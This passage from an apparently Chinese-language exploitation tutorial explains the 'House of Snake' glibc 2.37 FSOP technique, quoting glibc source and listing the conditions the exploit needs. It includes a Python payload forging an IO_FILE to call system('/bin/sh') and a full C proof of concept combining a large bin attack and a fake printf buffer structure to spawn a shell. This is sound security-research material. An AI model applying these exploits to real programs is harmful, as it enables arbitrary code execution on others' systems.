<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr = heap_addr + <span class="number">0x1390</span></span><br><span class="line">obstack_ptr = fake_io_addr + <span class="number">0x30</span></span><br><span class="line">fake_io_file = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(system_addr)  <span class="comment"># 需要执行的函数</span></span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_io_file += p64(fake_io_addr+<span class="number">0xe8</span>)  <span class="comment"># 执行函数的 rdi</span></span><br><span class="line">fake_io_file += p64(<span class="number">1</span>)  <span class="comment"># obstack-&gt;use_extra_arg=1</span></span><br><span class="line">fake_io_file += p64(heap_addr+<span class="number">0x2000</span>)  <span class="comment"># _IO_lock_t *_lock;</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(IO_obstack_jumps_addr + <span class="number">0x20</span>)  <span class="comment"># 触发 _IO_obstack_xsputn;</span></span><br><span class="line">fake_io_file += p64(obstack_ptr)  <span class="comment"># struct obstack *obstack</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(fake_io_file))) <span class="comment"># 因为是largebin attack 所以: 0xd8=0xe8-0x10</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 执行函数的 rdi 的地址所存储的内容</span></span><br><span class="line">payload = fake_io_file+ <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="House-of-Snake"><a href="#House-of-Snake" class="headerlink" title="House of Snake"></a>House of Snake</h2><p>glibc-2.37 删除了 <code>_IO_obstack_jumps</code> 但是添加了 <code>_IO_printf_buffer_as_file_jumps</code> 这个新的 <code>_IO_jumps_t</code> 结构体。 <code>_IO_printf_buffer_as_file_jumps</code> 中只有 <code>__printf_buffer_as_file_overflow</code> 和 <code>__printf_buffer_as_file_xsputn</code> 两个函数，而 House of Snake 利用的是 <code>__printf_buffer_as_file_overflow</code> 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_printf_buffer_as_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>__printf_buffer_as_file_overflow</code> 函数定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> __attribute_warn_unused_result__</span><br><span class="line">__printf_buffer_has_failed(<span class="keyword">struct</span> __printf_buffer *buf) &#123;</span><br><span class="line">    <span class="keyword">return</span> buf-&gt;mode == __printf_buffer_mode_failed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">__printf_buffer_as_file_overflow(FILE *fp, <span class="type">int</span> ch) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span> *<span class="title">file</span> =</span> (<span class="keyword">struct</span> __printf_buffer_as_file *) fp;</span><br><span class="line"></span><br><span class="line">    __printf_buffer_as_file_commit(file);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* EOF means only a flush is requested.   */</span></span><br><span class="line">    <span class="keyword">if</span> (ch != EOF)</span><br><span class="line">        __printf_buffer_putc(file-&gt;next, ch);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Ensure that flushing actually produces room.  */</span></span><br><span class="line">    <span class="keyword">if</span> (!__printf_buffer_has_failed(file-&gt;next)</span><br><span class="line">        &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</span><br><span class="line">        __printf_buffer_flush(file-&gt;next);</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先 <code>__printf_buffer_as_file_overflow </code> 函数将 <code>FILE</code> 结构体转换为 <code>__printf_buffer_as_file</code> 类型，相关定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *write_base;</span><br><span class="line">  <span class="type">char</span> *write_ptr;</span><br><span class="line">  <span class="type">char</span> *write_end;</span><br><span class="line">  <span class="type">uint64_t</span> written;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> <span class="title">mode</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Interface to libio.  */</span></span><br><span class="line">  FILE stream;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Pointer to the underlying buffer.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>之后调用了 <code>__printf_buffer_as_file_commit</code> ，该函数做了一些检查：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_as_file_commit (<span class="keyword">struct</span> __printf_buffer_as_file *file)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the write pointers in the file stream are consistent</span></span><br><span class="line"><span class="comment">     with the next buffer.  */</span></span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr);</span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end);</span><br><span class="line">  assert (file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base);</span><br><span class="line">  assert (file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end);</span><br><span class="line"></span><br><span class="line">  file-&gt;next-&gt;write_ptr = file-&gt;stream._IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后根据参数 <code>ch</code> 是否为 <code>EOF</code> 决定是否调用 <code>__printf_buffer_putc</code> 。FSOP 中调用的 <code>_IO_flush_all_lockp</code> 函数中是通过 <code>_IO_OVERFLOW (fp, EOF)</code> 调用到 <code>vtable</code> 中的 <code>overflow</code> 函数，因此 <code>__printf_buffer_as_file_overflow</code> 的参数 <code>ch</code> 为 <code>EOF</code> 。 当然，即使调用到了 <code>__printf_buffer_putc</code> 也只是是做了一些指针记录的数值加减的操作，对此我们不用过多关注。</p>
<p>再之后会调用 <code>__printf_buffer_flush</code> 函数，调用条件是 <code>file-&gt;next.mode != __printf_buffer_mode_failed</code> 且 <code>file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code> 。</p>
<p><code>__printf_buffer_flush</code> 函数定义如下，这里再次检查 <code>file-&gt;next.mode != __printf_buffer_mode_failed</code> 然后调用 <code>__printf_buffer_do_flush</code> 函数，参数为 <code>file-&gt;next</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> Xprintf(n) __printf_##n</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Xprintf_buffer_flush Xprintf (buffer_flush)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Xprintf_buffer Xprintf (buffer)</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span></span><br><span class="line"><span class="title function_">Xprintf_buffer_flush</span> <span class="params">(<span class="keyword">struct</span> Xprintf_buffer *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (Xprintf_buffer_has_failed (buf)))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  Xprintf (buffer_do_flush) (buf); <span class="comment">// __printf_buffer_do_flush(buf)</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>file-&gt;next.mode = __printf_buffer_mode_obstack(11)</code> 那么会调用 <code>__printf_buffer_flush_obstack</code> 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_do_flush (<span class="keyword">struct</span> __printf_buffer *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (buf-&gt;mode)</span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_obstack:</span><br><span class="line">      __printf_buffer_flush_obstack ((<span class="keyword">struct</span> __printf_buffer_obstack *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里 <code>__printf_buffer_obstack</code> 结构体定义如下： </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> <span class="title">base</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">  <span class="type">char</span> ch;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>如果满足 <code>buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1</code> 则 <code>__printf_buffer_flush_obstack</code> 会执行 <code>obstack_1grow</code> 宏。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__printf_buffer_flush_obstack (<span class="keyword">struct</span> __printf_buffer_obstack *buf)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;base.write_ptr == &amp;buf-&gt;ch + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      obstack_1grow (buf-&gt;obstack, buf-&gt;ch);</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> <code>obstack_1grow</code> 宏展开内容如下，可以看到该宏调用了 <code>_obstack_newchunk</code> 函数并将 <code>buf-&gt;obstack</code> 作为参数传入。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">声明位置: obstack.h  </span><br><span class="line">定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_1grow(OBSTACK, datum)                          \</span></span><br><span class="line"><span class="meta">  __extension__                                      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);                          \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)                  \</span></span><br><span class="line"><span class="meta">     _obstack_newchunk (__o, 1);                          \</span></span><br><span class="line"><span class="meta">       obstack_1grow_fast (__o, datum);                          \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br><span class="line">替换:  </span><br><span class="line">(&#123;</span><br><span class="line">    <span class="keyword">struct</span> obstack *__o = (buf-&gt;obstack);</span><br><span class="line">    <span class="keyword">if</span> (__o-&gt;next_free + <span class="number">1</span> &gt; __o-&gt;chunk_limit)_obstack_newchunk(__o, <span class="number">1</span>);</span><br><span class="line">    (*((__o)-&gt;next_free)++ = (buf-&gt;ch));</span><br><span class="line">    (<span class="type">void</span>) <span class="number">0</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>

<p><code>_obstack_newchunk</code> 函数会执行 <code>CALL_CHUNKFUN</code> 宏，这和前面的 House of 琴瑟琵琶利用链相同。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  ...</span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>回顾一下整个分析过程并将所有相关结构体，并都看成 <code>__printf_buffer_as_file</code> 结构体，有以下条件：</p>
<ul>
<li>在 <code>__printf_buffer_as_file_overflow</code> 函数中：<ul>
<li><code>file-&gt;next-&gt;mode!=__printf_buffer_mode_failed &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code></li>
</ul>
</li>
<li>在 <code>__printf_buffer_as_file_commit</code> 函数中：<ul>
<li><code>file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr</code></li>
<li><code>file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end</code></li>
<li><code>file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base</code></li>
<li><code>file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end</code></li>
</ul>
</li>
<li>在 <code>__printf_buffer_flush</code> 函数中：<ul>
<li><code>file-&gt;next-&gt;mode =__printf_buffer_mode_obstack</code></li>
</ul>
</li>
<li>在 <code>__printf_buffer_flush_obstack</code> 函数中：<ul>
<li><code>buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1</code> &lt;&#x3D;&#x3D;&gt; <code>file-&gt;next.write_ptr == &amp;(file-&gt;next) + 0x30 + 1</code></li>
</ul>
</li>
<li>在 <code>obstack_1grow</code> 宏定义中：<ul>
<li><code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;next_free + 1 &gt; (struct __printf_buffer_obstack *) file-&gt;obstack-&gt;chunk_limit</code></li>
<li><code>(h)-&gt;use_extra_arg</code> 不为 0 &lt;&#x3D;&#x3D;&gt; <code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;use_extra_arg != 0</code></li>
</ul>
</li>
</ul>
<p>最终调用 <code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;chunkfun((struct __printf_buffer_obstack *) file-&gt;obstack-&gt;extra_arg)</code> 。</p>
<p>具体构造如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/0c9e82b6d37adf715968b6b9b18c2815.png"
                     
                ><br><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_snake" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint-gcc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> &#123;</span></span><br><span class="line">    __printf_buffer_mode_failed,</span><br><span class="line">    __printf_buffer_mode_sprintf,</span><br><span class="line">    __printf_buffer_mode_snprintf,</span><br><span class="line">    __printf_buffer_mode_sprintf_chk,</span><br><span class="line">    __printf_buffer_mode_to_file,</span><br><span class="line">    __printf_buffer_mode_asprintf,</span><br><span class="line">    __printf_buffer_mode_dprintf,</span><br><span class="line">    __printf_buffer_mode_strfmon,</span><br><span class="line">    __printf_buffer_mode_fp,            <span class="comment">/* For __printf_fp_l_buffer.  */</span></span><br><span class="line">    __printf_buffer_mode_fp_to_wide,    <span class="comment">/* For __wprintf_fp_l_buffer.  */</span></span><br><span class="line">    __printf_buffer_mode_fphex_to_wide, <span class="comment">/* For __wprintf_fphex_l_buffer.  */</span></span><br><span class="line">    __printf_buffer_mode_obstack,       <span class="comment">/* For __printf_buffer_flush_obstack.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *write_base;</span><br><span class="line">    <span class="type">char</span> *write_ptr;</span><br><span class="line">    <span class="type">char</span> *write_end;</span><br><span class="line">    <span class="type">uint64_t</span> written;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> <span class="title">mode</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> <span class="title">base</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//leak libc_base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] leak libc_base.&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x74960</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// large bin attack: _IO_list_all -&gt; large</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijack _IO_list_all by large bin attack.&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> IO_list_all_addr = libc_base + <span class="number">0x1d2680</span>;</span><br><span class="line">    <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">free</span>(large);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted);</span><br><span class="line">    large[<span class="number">3</span>] = IO_list_all_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] construct fake file.&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_printf_buffer_as_file = large - <span class="number">2</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span> *<span class="title">fake_printf_buffer_obstack</span> =</span> fake_printf_buffer_as_file + <span class="number">29</span>;</span><br><span class="line">    <span class="type">size_t</span> *fake_obstack = (<span class="type">size_t</span> *) &amp;fake_printf_buffer_obstack-&gt;obstack;</span><br><span class="line">    <span class="type">char</span> *arg = (<span class="type">char</span> *) &amp;fake_obstack[<span class="number">11</span>];</span><br><span class="line">    <span class="type">size_t</span> IO_printf_buffer_as_file_jumps = libc_base + <span class="number">0x1cdd60</span>;<span class="comment">// _IO_printf_buffer_as_file_jumps</span></span><br><span class="line"></span><br><span class="line">    fake_printf_buffer_as_file[<span class="number">4</span>] = <span class="number">0</span>;                                           <span class="comment">// _IO_write_base</span></span><br><span class="line">    fake_printf_buffer_as_file[<span class="number">5</span>] = (<span class="type">size_t</span>) &amp;fake_printf_buffer_obstack-&gt;ch + <span class="number">1</span>;<span class="comment">// _IO_write_ptr</span></span><br><span class="line">    fake_printf_buffer_as_file[<span class="number">6</span>] = fake_printf_buffer_as_file[<span class="number">5</span>];               <span class="comment">// _IO_write_end</span></span><br><span class="line">    fake_printf_buffer_as_file[<span class="number">27</span>] = IO_printf_buffer_as_file_jumps;             <span class="comment">// vtable</span></span><br><span class="line">    fake_printf_buffer_as_file[<span class="number">28</span>] = (<span class="type">size_t</span>) fake_printf_buffer_obstack;        <span class="comment">//next</span></span><br><span class="line"></span><br><span class="line">    fake_printf_buffer_obstack-&gt;base.write_base = <span class="number">0</span>;</span><br><span class="line">    fake_printf_buffer_obstack-&gt;base.write_ptr = <span class="number">0</span>;</span><br><span class="line">    fake_printf_buffer_obstack-&gt;base.write_end = (<span class="type">char</span> *) fake_printf_buffer_as_file[<span class="number">5</span>];</span><br><span class="line">    fake_printf_buffer_obstack-&gt;base.mode = __printf_buffer_mode_obstack;</span><br><span class="line">    fake_printf_buffer_obstack-&gt;obstack = (<span class="keyword">struct</span> obstack *) &amp;fake_printf_buffer_obstack-&gt;obstack;</span><br><span class="line"></span><br><span class="line">    fake_obstack[<span class="number">7</span>] = (<span class="type">size_t</span>) system;</span><br><span class="line">    fake_obstack[<span class="number">9</span>] = (<span class="type">size_t</span>) arg;</span><br><span class="line">    fake_obstack[<span class="number">10</span>] = <span class="number">0x1</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(arg, <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger FSOP.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

